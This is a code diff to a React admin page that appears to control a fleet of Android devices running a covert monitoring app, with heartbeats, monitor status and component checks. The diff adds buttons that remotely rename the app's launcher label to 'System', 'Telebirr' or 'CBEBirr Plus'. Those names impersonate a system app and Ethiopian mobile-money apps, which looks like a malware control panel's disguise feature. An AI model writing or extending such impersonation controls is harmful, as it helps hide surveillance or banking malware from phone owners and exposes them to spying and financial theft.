@@ -7,8 +7,14 @@ type Device = {
   deviceId:string; model:string; androidVersion:string; appVersion:string;
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
-  ip?:string; userAgent?:string;
+  ip?:string; userAgent?:string; alias?:string; appLabel?:string;
 };
+
+const ALIAS_OPTIONS = [
+  { key: "system", label: "System" },
+  { key: "telebirr", label: "Telebirr" },
+  { key: "cbebirr-plus", label: "CBEBirr Plus" },
+];
 
 export default function DeviceDetail(){
   const { deviceId } = useParams() as { deviceId: string };
@@ -53,6 +59,19 @@ export default function DeviceDetail(){
       <span className={`text-xs px-2 py-1 rounded-full ${dev.monitorRunning?"bg-green-100 text-green-700":"bg-gray-100"}`}>{dev.monitorRunning?"monitor running":"monitor stopped"}</span>
     </div>
     <p className="text-sm text-gray-500 mt-1">{dev.model} · Android {dev.androidVersion} · {dev.appVersion} · {dev.heartbeatCount} heartbeats</p>
+
+    <div className="border rounded-2xl p-4 mt-4">
+      <div className="text-xs text-gray-500">Launcher name (vanity)</div>
+      <div className="text-sm mt-1">Currently <span className="font-semibold">{dev.appLabel||"Uncry"}</span> — tap a name to rename this device within 5s</div>
+      <div className="flex gap-2 mt-3">{ALIAS_OPTIONS.map(o=>(
+        <button key={o.key} onClick={async()=>{
+          const r=await fetch(`/api/devices/${encodeURIComponent(dev.deviceId)}/rename`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({alias:o.key})});
+          const j=await r.json();
+          if(r.ok) alert(`Rename queued — ${dev.deviceId.slice(0,8)} becomes "${o.label}" within 5s`);
+          else alert(`Rename failed: ${j.error}`);
+        }} className={`text-sm px-4 py-1.5 rounded-lg border ${(dev.alias||"uncry")===o.key?"bg-slate-800 text-white border-slate-800":"hover:bg-gray-100"}`}>{o.label}</button>
+      ))}</div>
+    </div>
 
     <div className="grid grid-cols-2 gap-4 mt-6">
       <div className="border rounded-2xl p-4"><div className="text-xs text-gray-500">Installed</div><div className="mt-1 text-sm">{dev.installed.length ? dev.installed.map(s=> <span key={s} className="inline-block bg-green-50 border border-green-200 rounded-full px-2 py-1 text-xs mr-1 mb-1">{s}</span>) : <span className="text-gray-400">none</span>}</div><div className="text-xs text-gray-400 mt-2">Missing: {dev.missing.join(", ")||"—"}</div></div>
